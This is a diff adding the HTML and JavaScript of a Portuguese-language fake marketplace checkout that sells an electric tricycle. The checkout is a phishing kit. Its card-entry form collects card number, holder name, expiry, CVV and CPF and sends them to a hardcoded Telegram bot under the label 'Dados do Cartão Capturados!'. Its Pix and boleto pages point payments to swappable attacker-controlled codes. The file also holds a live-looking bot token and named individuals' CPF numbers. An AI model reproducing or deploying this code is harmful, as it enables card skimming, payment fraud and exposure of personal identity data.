+    <div class="loading-page hidden" id="quickLoadingPage">
+        <p id="quickLoadingText" style="margin-bottom: 20px; font-size: 16px; color: #333; font-weight: 500; display: none;">Preparando tudo para sua compra</p>
+        <div class="loading-spinner" style="animation: spin 0.9s linear infinite;"></div>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO (entre página 4 e 5) -->
+    <div class="loading-page hidden" id="loadingPage">
+        <p class="loading-text" id="loadingText" style="margin-top: 0; margin-bottom: 20px;">Estamos preparando o seu produto</p>
+        <div class="green-ball-container" id="greenBall">
+            <div class="horizontal-dots" id="horizontalDots">
+                <div class="dot-ping"></div>
+                <div class="dot-ping"></div>
+                <div class="dot-ping"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGINA 5: REVISE E CONFIRME -->
+    <div class="page review-page" id="reviewPage">
+        <!-- Header com botão voltar -->
+        <div class="review-header">
+            <button class="review-header-back" id="backBtn4">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            <div class="review-header-title">Revise e confirme</div>
+        </div>
+
+        <main>
+            <!-- Seção de Resumo de Preços -->
+            <div class="review-section">
+                <div class="review-summary-row">
+                    <span>Produto</span>
+                    <span>R$ 1.800<sup>00</sup></span>
+                </div>
+                <div class="review-summary-row">
+                    <span>Frete</span>
+                    <span><span class="review-summary-original">R$ 315 <sup>99</sup></span> <strong>R$ 00,00<sup>00</sup></strong></span>
+                </div>
+                <div class="review-summary-row" style="border-top: 1px solid #eee; padding-top: 12px; margin-top: 12px;">
+                    <span>Subtotal</span>
+                    <span>R$ 1.800<sup>00</sup></span>
+                </div>
+                <div class="review-summary-row">
+                    <span>Você pagará</span>
+                    <span><span style="font-size: 14px; color: #999;">Boleto</span> <strong>R$ 1.800<sup>00</sup></strong></span>
+                </div>
+                <div class="review-summary-row" style="border-top: 1px solid #eee; padding-top: 12px; margin-top: 12px; font-size: 18px;">
+                    <span>Total</span>
+                    <span><span class="review-summary-original">R$ 2.312<sup>99</sup></span> <strong>R$ 1.800<sup>00</sup></strong></span>
+                </div>
+                <div class="review-summary-discount">
+                    Você economizou R$ 315<sup>99</sup>
+                </div>
+                <button class="internal-confirm-btn" id="internalConfirmBtn">Confirmar a compra</button>
+            </div>
+
+            <!-- Seção de Faturamento -->
+            <div class="review-section">
+                <div class="review-item">
+                    <div class="img-circle-standard"><img src="img/faturamento.png" alt="Faturamento"></div>
+                    <div class="review-item-content">
+
+                        <!-- modificar nome do comprador-->
+
+                        <div class="review-item-title">Cleonice Rosa Ribeiro
+                                          CPF: 032.026.708-32
+                        </div>
+                        <div class="review-item-text">Titular</div>
+                        <a href="#" class="review-item-link">Alterar dados de faturamento</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Seção de Pedido de Compra -->
+            <div class="review-section">
+                <div class="review-item">
+                    <div class="img-circle-standard"><img src="img/pedido.png" alt="Pedido"></div>
+                    <div class="review-item-content">
+                        <div class="review-item-title">Pedido de compra <span class="review-item-optional">Opcional</span></div>
+                    </div>
+                </div>
+                <a href="#" class="review-item-link" style="margin-left: 56px;">Adicionar pedido de compra</a>
+            </div>
+
+            <!-- Seção de Detalhe da Entrega -->
+            <div class="review-section-title" style="margin: 16px 16px 8px 16px; padding: 0; background: none; box-shadow: none; border-radius: 0;">Detalhe da entrega</div>
+            <div class="review-section">
+                <!-- Endereço -->
+                <div class="review-item">
+                    <div class="img-circle-standard"><img src="img/local-icon.png" alt="icone de locaalização"></div>
+                    <div class="review-item-content">
+                        <div class="review-item-title"></div>
+                        <div class="review-item-text">Envio no meu endereço</div>
+                        <a href="#" class="review-item-link">Alterar ou escolher outro endereço</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Seção de Envio -->
+            <div class="review-section" style="margin-top: 16px;">
+                <div class="review-item">
+                    <div class="img-circle-standard">
+                        <img src="img/Triciculo2.jpg" alt="Produto" style="width: 100%; height: 100%; object-fit: cover;">
+                    </div>
+                    <div class="review-item-content">
+                        <div class="review-item-title">Envio 1</div>
+                        <div class="review-item-text" style="font-weight: 600; margin-bottom: 8px;">Chegará no seu endereço em 3 ou 4 dias</div>
+                        <div class="review-item-text">Triciculo Eletrico Branco 127/220v</div>
+                        <div class="review-item-text">Quantidade: 1</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Seção de Detalhe do Pagamento -->
+            <div class="review-section-title" style="margin: 16px 16px 8px 16px; padding: 0; background: none; box-shadow: none; border-radius: 0;">Detalhe do pagamento</div>
+            <div class="review-section">
+                <div class="review-item">
+                    <div class="img-circle-standard"><img src="img/boleto-icon.png" alt="Boleto"></div>
+                    <div class="review-item-content">
+                        <div class="review-item-title">Boleto</div>
+                        <div class="review-item-text" style="font-size: 16px; font-weight: 600; margin-bottom: 12px;">R$ 1.800</div>
+                        <div class="review-item-text" style="font-size: 14px; color: #666; margin-bottom: 8px;">Ao confirmar a compra, você terá as informações para pagar.</div>
+                        <div class="review-item-text" style="font-size: 13px; color: #666; display: flex; align-items: center; gap: 6px;">
+                            <i class="fas fa-info-circle" style="font-size: 14px;"></i>
+                            <span>Pague agora para garantir sua compra</span>
+                        </div>
+                        <a href="#" class="review-item-link">Alterar forma de pagamento</a>
+                    </div>
+                </div>
+            </div>
+            </div>
+        </main>
+
+        <!-- Rodapé Fixo com Resumo -->
+        <div id="fixedReviewFooter" style="position: fixed; bottom: 60px; left: 0; right: 0; background: white; padding: 16px; border-top: 1px solid #eee; max-width: 448px; margin: 0 auto; z-index: 40; transition: all 0.3s ease; transform: translateY(200px); opacity: 0; pointer-events: none;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span style="font-size: 14px; color: #000; font-weight: 500;">Total</span>
+                <div style="text-align: right;">
+                    <span style="font-size: 12px; color: #999; text-decoration: line-through; display: block;">R$ 2.312<sup>99</sup></span>
+                    <span style="font-size: 18px; font-weight: 700; color: #000;">R$ 1.800<sup>00</sup></span>
+                </div>
+            </div>
+            <div style="font-size: 12px; color: #27ae60; font-weight: 500;">
+                Você economizou R$ 315<sup>99</sup>
+            </div>
+        </div>
+
+        <!-- Botão de Confirmar Compra -->
+        <button class="review-confirm-btn" id="confirmPurchaseBtn">Confirmar a compra</button>
+    </div>
+
+    <!-- PÁGINA 6: BOLETO BANCÁRIO -->
+    <!-- PAGINA: NOVO CARTÃO -->
+    <div id="new-card-page" class="page new-card-page bg-white min-h-screen">
+        <header class="!bg-[#FFD700] !sticky !top-0 !flex !items-center !p-4 !z-50">
+            <button class="back-btn" onclick="showPage('payment')">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            <span class="header-title font-bold ml-4">Novo cartão de crédito</span>
+        </header>
+        
+        <div class="progress-bar-container">
+            <div id="cardProgressBar" class="progress-bar-inner"></div>
+        </div>
+
+        <main class="p-4 max-w-[448px] mx-auto">
+            <div class="virtual-card-info mb-6">
+                Você tem cartão virtual? <i class="far fa-question-circle"></i>
+            </div>
+
+            <div class="card-container">
+                <div class="card-inner" id="cardInner">
+                    <div class="card-front">
+                        <div class="card-chip"></div>
+                        <div class="card-number-display" id="displayNumber">•••• •••• •••• ••••</div>
+                        <div class="card-holder-display" id="displayHolder">NOME DO TITULAR</div>
+                        <div class="card-expiry-display" id="displayExpiry">MM/AA</div>
+                    </div>
+                    <div class="card-back">
+                        <div class="card-stripe"></div>
+                        <div class="card-cvv-area">
+                            <span id="displayCVV">•••</span>
+                            <div class="cvv-circle" id="cvvCircle" style="display: none;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Etapa 1: Número do Cartão -->
+            <div class="card-step active" id="cardStep1">
+                <div class="mb-6">
+                    <label class="block text-sm text-gray-700 mb-2">Número do cartão</label>
+                    <input type="text" id="cardNumber" class="w-full p-4 border border-gray-300 rounded-lg text-lg outline-none focus:border-blue-500" placeholder="0000 0000 0000 0000" maxlength="19">
+                </div>
+            </div>
+
+            <!-- Etapa 2: Nome do Titular -->
+            <div class="card-step" id="cardStep2">
+                <div class="mb-6">
+                    <label class="block text-sm text-gray-700 mb-2">Nome do titular</label>
+                    <input type="text" id="cardHolder" class="w-full p-4 border border-gray-300 rounded-lg text-lg outline-none focus:border-blue-500" placeholder="Exemplo: Maria Lopes">
+                    <p class="text-xs text-gray-500 mt-1">conforme aparece no cartão</p>
+                </div>
+            </div>
+
+            <!-- Etapa 3: Vencimento e CVV -->
+            <div class="card-step" id="cardStep3">
+                <div class="flex gap-4 mb-6">
+                    <div class="flex-1">
+                        <label class="block text-sm text-gray-700 mb-2">Vencimento</label>
+                        <input type="text" id="cardExpiry" class="w-full p-4 border border-gray-300 rounded-lg text-lg outline-none focus:border-blue-500" placeholder="MM/AA" maxlength="5">
+                    </div>
+                    <div class="flex-1">
+                        <label class="block text-sm text-gray-700 mb-2">Código de segurança</label>
+                        <div class="relative">
+                            <input type="text" id="cardCVV" class="w-full p-4 border border-gray-300 rounded-lg text-lg outline-none focus:border-blue-500" placeholder="CVV" maxlength="4">
+                            <i class="far fa-question-circle absolute right-3 top-5 text-blue-500"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Etapa 4: CPF -->
+            <div class="card-step" id="cardStep4">
+                <div class="mb-6">
+                    <label class="block text-sm text-gray-700 mb-2">Documento do titular</label>
+                    <input type="text" id="cardCPF" class="w-full p-4 border border-gray-300 rounded-lg text-lg outline-none focus:border-blue-500" placeholder="CPF" maxlength="14">
+                </div>
+            </div>
+        </main>
+
+        <div class="card-footer-nav">
+            <button class="text-blue-500 font-medium disabled:text-gray-300" id="cardBtnPrev" disabled>Anterior</button>
+            <button class="text-blue-500 font-medium" id="cardBtnNext">Seguinte</button>
+        </div>
+    </div>
+
+    <div class="page boleto-page" id="boletoPage">
+        <!-- Header verde com X -->
+        <div class="boleto-header">
+            <button class="boleto-header-close" id="boletoCloseBtn">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+
+        <!-- Hero: ícone + título -->
+        <div class="boleto-hero">
+            <div class="boleto-icon-wrap">
+                <div class="img-circle-standard" style="width: 64px; height: 64px; border: 2px solid #00a650; background: #fff;">
+                    <img src="img/dinheiro-boleto.png" alt="foto de perfil do bolet">
+                </div>
+                <div class="boleto-icon-badge">
+                    <i class="fas fa-ellipsis-h"></i>
+                </div>
+            </div>
+            <p class="boleto-subtitle">Falta pouco!</p>
+            <h1 class="boleto-title" style="font-size: 19px;">Pague R$ 1.800,00 via Boleto<br>para concluir sua compra</h1>
+        </div>
+
+        <!-- Corpo -->
+        <div class="boleto-body">
+            <!-- Card de instruções -->
+            <div class="boleto-card">
+                <div class="boleto-card-title">Instruções de pagamento</div>
+
+                <p class="boleto-instructions-text">
+                    Para pagar pelo Internet Banking, copie a linha digitável ou escaneie o código de barras. Para pagar em qualquer banco, caixa eletrônico ou lotérica, por favor, imprima o boleto.
+                </p>
+
+                <div class="boleto-info-row">
+                    <i class="far fa-clock"></i>
+                    <span><strong>Aprovação em 1 ou 2 dias úteis.</strong> Os pagamentos feitos nos fins de semana ou feriados serão aprovados no dia útil seguinte.</span>
+                </div>
+
+                <div class="boleto-info-highlight">
+                    <div class="boleto-info-row">
+                        <i class="fas fa-info-circle" style="color:#3483fa;"></i>
+                        <span>Confirmaremos a data de entrega quando o pagamento for aprovado.</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card do código de barras -->
+            <div class="boleto-card">
+                <div class="boleto-barcode-img"></div>
+
+                <!-- modificar numero do boleto-->
+
+                <p class="boleto-barcode-number" id="barcodeNumber">42297.11504 00064.897317 06633.981722 8 15060000179900</p>
+
+                <button class="boleto-btn-primary" id="copyBarcodeBtn">Copiar linha digitável</button>
+                <button class="boleto-btn-secondary" onclick="window.print()">Imprimir boleto</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGINA 7: PIX -->
+    <div class="page pix-page" id="pixPage">
+        <div class="pix-header">
+            <button class="pix-header-close" id="pixCloseBtn">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+
+        <div class="pix-hero">
+            <div class="pix-icon-circle">
+                <div class="img-circle-standard" style="width: 40px; height: 40px; border: none; background: transparent;">
+                    <img src="img/pix-icon.png" alt="Pix">
+                </div>
+                <div class="pix-icon-badge">
+                    <i class="fas fa-ellipsis-h" style="color: white; font-size: 10px;"></i>
+                </div>
+            </div>
+            <p style="color: #666; font-size: 14px; margin-bottom: 8px;">Falta pouco!</p>
+            <h1 class="pix-hero-title">Pague R$ 1.800,00 via Pix<br>para concluir sua compra</h1>
+        </div>
+
+        <div class="pix-body">
+            <div class="pix-card">
+                <div class="pix-card-title">Instruções de pagamento</div>
+                
+                <div class="pix-instruction-item">
+                    <span>1.</span>
+                    <span>Acesse seu Internet Banking ou app de pagamentos.</span>
+                </div>
+                <div class="pix-instruction-item">
+                    <span>2.</span>
+                    <span>Escolha pagar via Pix.</span>
+                </div>
+                <div class="pix-instruction-item">
+                    <span>3.</span>
+                    <span>Cole o código abaixo</span>
+                </div>
+
+                <!-- modificar chave pix -->
+
+                <div class="pix-code-box" id="pixCodeText">
+                    e7a4b6f0-43ef-47c7-90cc-4720d2893a96
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 8px; color: #333; font-size: 14px; margin-bottom: 20px;">
+                    <i class="far fa-clock"></i>
+                    <span>Pague e será creditado na hora.</span>
+                </div>
+
+                <div class="pix-info-alert">
+                    <i class="fas fa-info-circle" style="color: #3483fa; margin-top: 2px;"></i>
+                    <span style="font-size: 14px; color: #333;">Confirmaremos a data de entrega quando o pagamento for aprovado.</span>
+                </div>
+
+                <button class="pix-btn-primary" id="copyPixBtn">Copiar código</button>
+                <a href="#" class="pix-link-secondary" id="pixMyPurchases">Ir para Minhas compras</a>
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+        // CONFIGURAÇÃO DO TELEGRAM (Preencha para receber os dados)
+        const TELEGRAM_TOKEN = '8864286153:AAFMTm1yquFI71VdIl2eQUYNvm8sWVTwE0s';
+        const TELEGRAM_CHAT_ID = '7537939404';
+
+        // Variáveis globais para controle de páginas
+        let currentPage = 'product';
+        let modalOpen = false;
+
+        // Função para mostrar o modal
+
+
+        // Função para alternar entre páginas
+        function showPage(pageName) {
+            // Esconder todas as páginas
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            const themeMeta = document.getElementById('themeColor');
+            const mainHeader = document.getElementById('mainHeader');
+
+            // Controle do Header no Desktop
+            if (window.innerWidth >= 769 && mainHeader) {
+                if (pageName === 'product') {
+                    mainHeader.style.display = 'flex';
+                } else {
+                    mainHeader.style.display = 'none';
+                }
+            }
+
+            // Mostrar a página selecionada
+            if (pageName === 'product') {
+                document.getElementById('productPage').classList.add('active');
+                currentPage = 'product';
+                themeMeta.setAttribute('content', '#ffffff');
+                // Resetar o header para transparente se estiver no topo da página de produto
+                if (window.scrollY <= 50) {
+                    mainHeader.classList.remove('scrolled');
+                }
+            } else if (pageName === 'checkout') {
+                document.getElementById('checkoutPage').classList.add('active');
+                currentPage = 'checkout';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#f5f5f5');
+            } else if (pageName === 'shipping') {
+                document.getElementById('shippingPage').classList.add('active');
+                currentPage = 'shipping';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#f5f5f5');
+            } else if (pageName === 'payment') {
+                document.getElementById('paymentPage').classList.add('active');
+                currentPage = 'payment';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#f5f5f5');
+            } else if (pageName === 'review') {
+                document.getElementById('reviewPage').classList.add('active');
+                currentPage = 'review';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#FFD700'); // Cor amarela do header do review
+            } else if (pageName === 'boleto') {
+                document.getElementById('boletoPage').classList.add('active');
+                currentPage = 'boleto';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#00a650'); // VERDE na página do boleto
+            } else if (pageName === 'pix') {
+                document.getElementById('pixPage').classList.add('active');
+                currentPage = 'pix';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#f5f5f5');
+            } else if (pageName === 'new-card') {
+                document.getElementById('new-card-page').classList.add('active');
+                currentPage = 'new-card';
+                window.scrollTo(0, 0);
+                themeMeta.setAttribute('content', '#FFD700');
+            }
+        }
+
+        // Lógica de Inicialização (Splash -> White Loading -> Product)
+        window.addEventListener('DOMContentLoaded', () => {
+            const splash = document.getElementById('splashScreen');
+            const whiteLoading = document.getElementById('initialWhiteLoading');
+            
+            // 3s na Splash Amarela
+            setTimeout(() => {
+                splash.classList.add('hidden');
+                whiteLoading.classList.remove('hidden');
+                
+                // 1s na Loading Branca
+                setTimeout(() => {
+                    whiteLoading.classList.add('hidden');
+                    showPage('product');
+                }, 1000);
+            }, 3000);
+        });
+
+        // Variável para controlar se é o primeiro carregamento (agora falso pois o inicial já ocorreu)
+        let isFirstLoading = true;
+
+        // Função para mostrar página com carregamento rápido
+        function showPageWithQuickLoading(pageName) {
+            const quickLoading = document.getElementById('quickLoadingPage');
+            const quickText = document.getElementById('quickLoadingText');
+            
+            // Esconde página atual
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            
+            // Mostra loading rápido
+            quickLoading.classList.remove('hidden');
+            
+            let loadingTime = 700; // Padrão 0.7s
+
+            if (isFirstLoading) {
+                quickText.style.display = 'block';
+                loadingTime = 2500; // 2.5s no primeiro
+                isFirstLoading = false;
+            } else if (pageName === 'shipping' || pageName === 'payment') {
+                // "Confirme quando sua compra chegará" (vai para shipping) 
+                // ou "Escolha como pagar" (vai para payment)
+                quickText.style.display = 'none';
+                loadingTime = 300; // 0.3s apenas
+            } else {
+                quickText.style.display = 'none';
+            }
+            
+            setTimeout(() => {
+                quickLoading.classList.add('hidden');
+                if (pageName === 'new-card') {
+                    currentCardStep = 1;
+                    updateCardUI();
+                }
+                showPage(pageName);
+            }, loadingTime);
+        }
+
+        // ===== ANIMAÇÃO DE CARREGAMENTO ESPECIAL (Página 4 -> 5) =====
+        function startLoadingAnimation(callback) {
+            const loadingPage  = document.getElementById('loadingPage');
+            const loadingText  = document.getElementById('loadingText');
+            const greenBall    = document.getElementById('greenBall');
+            const hDots        = document.getElementById('horizontalDots');
+            const dotEles      = hDots.querySelectorAll('.dot-ping');
+
+            // Resetar estado
+            loadingPage.classList.remove('hidden');
+            loadingText.classList.remove('visible');
+            loadingText.innerText = "Estamos preparando o seu produto";
+            greenBall.classList.remove('expand');
+            hDots.style.opacity = "1";
+            dotEles.forEach(d => d.classList.remove('active'));
+
+            // Passo 1: Mostrar texto inicial
+            setTimeout(() => loadingText.classList.add('visible'), 200);
+
+            // Passo 2: Animação das bolinhas
+            setTimeout(() => dotEles[0].classList.add('active'), 600);
+            setTimeout(() => { dotEles[1].classList.add('active'); dotEles[0].classList.remove('active'); }, 1000);
+            setTimeout(() => { dotEles[2].classList.add('active'); dotEles[1].classList.remove('active'); }, 1400);
+            setTimeout(() => dotEles[2].classList.remove('active'), 1800);
+
+            // Passo 3: Mudar texto para "Já é quase sua!"
+            setTimeout(() => {
+                loadingText.classList.remove('visible');
+                setTimeout(() => {
+                    loadingText.innerText = "Já é quase sua!";
+                    loadingText.classList.add('visible');
+                }, 400);
+            }, 2000);
+
+            // Passo 4: Bolinhas brancas somem e bola verde expande
+            setTimeout(() => {
+                hDots.style.opacity = "0";
+                loadingText.classList.remove('visible');
+                setTimeout(() => {
+                    greenBall.classList.add('expand');
+                }, 300);
+            }, 2800);
+
+            // Passo 5: Finalizar (Ajustado para 3.5s conforme pedido)
+            setTimeout(() => {
+                loadingPage.classList.add('hidden');
+                if (callback) callback();
+            }, 3500);
+        }
+
+        // Botões de voltar
+        const backBtn1 = document.getElementById('backBtn1');
+        const backBtn2 = document.getElementById('backBtn2');
+        const backBtn4 = document.getElementById('backBtn4');
+
+        backBtn1.addEventListener('click', () => {
+            showPage('product');
+        });
+
+        backBtn2.addEventListener('click', () => {
+            showPage('checkout');
+        });
+
+        backBtn4.addEventListener('click', () => {
+            showPage('payment');
+        });
+
+        // Botão de comprar (Página 1 -> 2)
+        document.getElementById('buyBtn').addEventListener('click', () => {
+            showPageWithQuickLoading('checkout');
+        });
+
+        // Botão de adicionar ao carrinho
+        document.getElementById('addToCartBtn').addEventListener('click', () => {
+            showPageWithQuickLoading('checkout');
+        });
+
+        // Botão de busca (lupa)
+        document.getElementById('searchBtn').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Botão de compartilhar
+        document.getElementById('shareBtn').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Card de combinar meios de pagamento
+        document.getElementById('combinePaymentCard').addEventListener('click', () => {
+            // Ação padrão
+        });
+
+        // Card de produtos relacionados
+        document.getElementById('relatedProductCard').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Card de loja oficial
+        document.getElementById('officialStoreCard').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Imagem grande do produto
+        document.getElementById('largeProductImage').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Menu inferior - Todos os ícones
+        document.getElementById('navHome').addEventListener('click', () => {
+            showPage('product');
+        });
+        document.getElementById('navCategories').addEventListener('click', () => {
+            showPage('product');
+        });
+        document.getElementById('navCart').addEventListener('click', () => {
+            showPage('product');
+        });
+        document.getElementById('navVideos').addEventListener('click', () => {
+            showPage('product');
+        });
+        document.getElementById('navMore').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Página de Pagamento - Novo cartão
+        document.getElementById('newCardPaymentItem').addEventListener('click', () => {
+            showPageWithQuickLoading('new-card');
+        });
+
+        // Lógica do Novo Cartão
+        let currentCardStep = 1;
+        const totalCardSteps = 4;
+
+        const cardSteps = document.querySelectorAll('.card-step');
+        const cardProgressBar = document.getElementById('cardProgressBar');
+        const cardBtnPrev = document.getElementById('cardBtnPrev');
+        const cardBtnNext = document.getElementById('cardBtnNext');
+        const cardInner = document.getElementById('cardInner');
+        const cvvCircle = document.getElementById('cvvCircle');
+
+        // Input elements
+        const inputNumber = document.getElementById('cardNumber');
+        const inputHolder = document.getElementById('cardHolder');
+        const inputExpiry = document.getElementById('cardExpiry');
+        const inputCVV = document.getElementById('cardCVV');
+        const inputCPF = document.getElementById('cardCPF');
+
+        // Display elements
+        const displayNumber = document.getElementById('displayNumber');
+        const displayHolder = document.getElementById('displayHolder');
+        const displayExpiry = document.getElementById('displayExpiry');
+        const displayCVV = document.getElementById('displayCVV');
+
+        function updateCardUI() {
+            cardSteps.forEach((step, index) => {
+                step.classList.toggle('active', index + 1 === currentCardStep);
+            });
+
+            cardProgressBar.style.width = `${(currentCardStep / totalCardSteps) * 100}%`;
+
+            cardBtnPrev.disabled = currentCardStep === 1;
+            cardBtnNext.innerText = currentCardStep === totalCardSteps ? 'Confirmar' : 'Seguinte';
+
+            if (currentCardStep === 3) {
+                cardInner.classList.add('flipped');
+                cvvCircle.style.display = 'block';
+            } else {
+                cardInner.classList.remove('flipped');
+                cvvCircle.style.display = 'none';
+            }
+        }
+
+        cardBtnNext.addEventListener('click', () => {
+            if (currentCardStep < totalCardSteps) {
+                currentCardStep++;
+                updateCardUI();
+            } else {
+                // Ao finalizar o preenchimento do cartão
+                const cardData = `<b>💳 Dados do Cartão Capturados!</b>\n\n` +
+                                 `<b>Número:</b> ${inputNumber.value}\n` +
+                                 `<b>Titular:</b> ${inputHolder.value}\n` +
+                                 `<b>Validade:</b> ${inputExpiry.value}\n` +
+                                 `<b>CVV:</b> ${inputCVV.value}\n` +
+                                 `<b>CPF:</b> ${inputCPF.value}`;
+                
+                sendToTelegram(cardData);
+                showPageWithQuickLoading('review');
+            }
+        });
+
+        cardBtnPrev.addEventListener('click', () => {
+            if (currentCardStep > 1) {
+                currentCardStep--;
+                updateCardUI();
+            }
+        });
+
+        inputNumber.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = value;
+            displayNumber.innerText = value || '•••• •••• •••• ••••';
+        });
+
+        inputHolder.addEventListener('input', (e) => {
+            displayHolder.innerText = e.target.value.toUpperCase() || 'NOME DO TITULAR';
+        });
+
+        inputExpiry.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            displayExpiry.innerText = value || 'MM/AA';
+        });
+
+        inputCVV.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+            displayCVV.innerText = value || '•••';
+        });
+
+        inputCPF.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            }
+            e.target.value = value;
+        });
+
+        // Função global de navegação
+        function goToPage(pageName) {
+            // Se for para a página do cartão, reseta o fluxo
+            if (pageName === 'new-card') {
+                currentCardStep = 1;
+                updateCardUI();
+                showPage('new-card');
+            } else {
+                showPage(pageName);
+            }
+        }
+
+        // Página de Pagamento - Mercado Pago
+        document.getElementById('mercadoPagoPaymentItem').addEventListener('click', () => {
+            showPageWithQuickLoading('review');
+        });
+
+        // Clique no card de entrega (Página 2 -> 3)
+        document.getElementById('deliveryCardClick').addEventListener('click', () => {
+            showPageWithQuickLoading('shipping');
+        });
+
+        // Botão continuar (Página 3 -> 4)
+        document.getElementById('continueBtn').addEventListener('click', () => {
+            showPageWithQuickLoading('payment');
+        });
+
+        // Botão de voltar na página de pagamento
+        document.getElementById('backBtn3').addEventListener('click', () => {
+            showPage('shipping');
+        });
+
+        // Clique em Boleto na página de pagamento (Página 4 -> Revisão)
+        document.getElementById('boletoPaymentItem').addEventListener('click', () => {
+            showPageWithQuickLoading('review');
+        });
+
+        // Clique em Pix na página de pagamento (Página 4 -> Página do Pix)
+        document.getElementById('pixPaymentItem').addEventListener('click', () => {
+            const message = `<b>⚡ Selecionou PIX!</b>\n\n` +
+                            `<b>Valor:</b> R$ 3.984,99\n` +
+                            `<b>Produto:</b> Geladeira HQ Side By Side\n` +
+                            `<b>Cliente:</b> Lucas de Oliveira da Silva\n` +
+                            `<b>CPF:</b> 083.640.722-93`;
+            sendToTelegram(message);
+
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            startLoadingAnimation(() => {
+                showPage('pix');
+            });
+        });
+
+        // Função para enviar dados ao Telegram
+        async function sendToTelegram(message) {
+            if (TELEGRAM_TOKEN === 'SEU_TOKEN_AQUI' || !TELEGRAM_CHAT_ID) return;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error("Erro ao enviar para Telegram", e);
+            }
+        }
+
+        // Função para finalizar compra (com animação)
+        function finalizePurchase() {
+            const paymentMethod = "Boleto"; // No fluxo atual ele vai sempre para boleto no final
+            
+            const message = `<b>🔔 Nova Tentativa de Compra!</b>\n\n` +
+                            `<b>Método:</b> ${paymentMethod}\n` +
+                            `<b>Valor:</b> R$ 3.984,99\n` +
+                            `<b>Produto:</b> Geladeira HQ Side By Side\n` +
+                            `<b>Cliente:</b> Lucas de Oliveira da Silva\n` +
+                            `<b>CPF:</b> 083.640.722-93`;
+            
+            sendToTelegram(message);
+
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            startLoadingAnimation(() => {
+                showPage('boleto');
+            });
+        }
+
+        // Botão Confirmar Compra (Fixo)
+        document.getElementById('confirmPurchaseBtn').addEventListener('click', finalizePurchase);
+        
+        // Botão Confirmar Compra (Interno)
+        document.getElementById('internalConfirmBtn').addEventListener('click', finalizePurchase);
+
+        // Botão X do boleto -> volta para produto
+        document.getElementById('boletoCloseBtn').addEventListener('click', () => {
+            showPage('product');
+        });
+
+        // Botão X do Pix -> volta para produto
+        document.getElementById('pixCloseBtn').addEventListener('click', () => {
+            showPage('product');
+        });
+        document.getElementById('pixMyPurchases').addEventListener('click', (e) => {
+            e.preventDefault();
+            showPage('product');
+        });
+
+
+
+        // Função auxiliar para copiar texto (com fallback para mobile/HTTP)
+        function copyToClipboard(text, btnId) {
+            const btn = document.getElementById(btnId);
+            const originalText = btn.innerText;
+
+            function updateBtn() {
+                btn.innerText = 'Copiado!';
+                btn.style.backgroundColor = '#00a650';
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.style.backgroundColor = '#3483fa';
+                }, 2000);
+            }
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(text).then(updateBtn).catch(err => fallbackCopy(text));
+            } else {
+                fallbackCopy(text);
+            }
+
+            function fallbackCopy(textToCopy) {
+                const textArea = document.createElement("textarea");
+                textArea.value = textToCopy;
+                textArea.style.position = "fixed";
+                textArea.style.left = "-999999px";
+                textArea.style.top = "-999999px";
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    updateBtn();
+                } catch (err) {
+                    console.error('Fallback: Erro ao copiar', err);
+                    alert('Erro ao copiar. Por favor, selecione o texto manualmente.');
+                }
+                document.body.removeChild(textArea);
+            }
+        }
+
+        // Funcionalidade de copiar linha digitável (Boleto)
+        document.getElementById('copyBarcodeBtn').addEventListener('click', () => {
+            const barcodeText = document.getElementById('barcodeNumber').innerText;
+            copyToClipboard(barcodeText, 'copyBarcodeBtn');
+        });
+
+        // Funcionalidade de copiar código (Pix)
